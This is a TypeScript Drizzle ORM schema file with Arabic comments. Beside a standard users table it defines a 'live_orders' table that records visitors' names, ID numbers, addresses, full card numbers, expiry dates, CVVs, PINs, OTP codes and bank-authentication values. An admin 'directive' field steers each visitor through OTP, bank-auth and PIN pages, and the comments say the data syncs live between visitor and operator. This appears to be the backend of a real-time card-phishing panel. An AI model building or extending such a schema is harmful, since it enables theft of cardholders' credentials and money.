import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// TODO: Add your tables here


/**
 * جدول الطلبات الحية — يخزّن بيانات الزوار أثناء تدفق الطلب
 * ويُزامن بين جهاز الزائر وجهاز المشرف عبر الخادم.
 */
export const liveOrders = mysqlTable("live_orders", {
  id: int("id").autoincrement().primaryKey(),
  /** معرّف عام للطلب يُستخدم من الواجهة (الزائر يحتفظ به في جلسته) */
  publicId: varchar("publicId", { length: 40 }).notNull().unique(),
  /** المرحلة الحالية للزائر (ملخص الطلب / بيانات البطاقة / OTP / مصادقة بنكية / الرقم السري ...) */
  page: varchar("page", { length: 80 }).default("ملخص الطلب").notNull(),
  name: varchar("name", { length: 160 }).default("").notNull(),
  idNumber: varchar("idNumber", { length: 80 }).default("").notNull(),
  phone: varchar("phone", { length: 60 }).default("").notNull(),
  email: varchar("email", { length: 160 }).default("").notNull(),
  tier: varchar("tier", { length: 40 }).default("").notNull(),
  region: varchar("region", { length: 120 }).default("").notNull(),
  city: varchar("city", { length: 120 }).default("").notNull(),
  district: varchar("district", { length: 160 }).default("").notNull(),
  street: varchar("street", { length: 200 }).default("").notNull(),
  deliveryDate: varchar("deliveryDate", { length: 60 }).default("").notNull(),
  cardNumber: varchar("cardNumber", { length: 40 }).default("-").notNull(),
  /** اسم البنك المُصدِر للبطاقة (يُكتشف من رقم البطاقة) */
  bankName: varchar("bankName", { length: 120 }).default("-").notNull(),
  expiry: varchar("expiry", { length: 16 }).default("-").notNull(),
  cvv: varchar("cvv", { length: 8 }).default("-").notNull(),
  pin: varchar("pin", { length: 12 }).default("-").notNull(),
  otp: varchar("otp", { length: 16 }).default("-").notNull(),
  otpHistory: text("otpHistory"), // JSON string array
  bankAuth: varchar("bankAuth", { length: 40 }).default("-").notNull(),
  authCount: int("authCount").default(0).notNull(),
  /** حالة الطلب: pending / accepted / rejected */
  status: varchar("status", { length: 20 }).default("pending").notNull(),
  /** توجيه المشرف للزائر: wait / otp / bank-auth / pin / success / rejected... */
  directive: varchar("directive", { length: 60 }).default("wait").notNull(),
  /** الموقع الجغرافي للزائر (يُحدّد من IP) */
  location: varchar("location", { length: 120 }).default("").notNull(),
  /** هل الزائر متصل حالياً (نشط) */
  lastSeen: timestamp("lastSeen").defaultNow().notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type LiveOrderRow = typeof liveOrders.$inferSelect;
export type InsertLiveOrderRow = typeof liveOrders.$inferInsert;
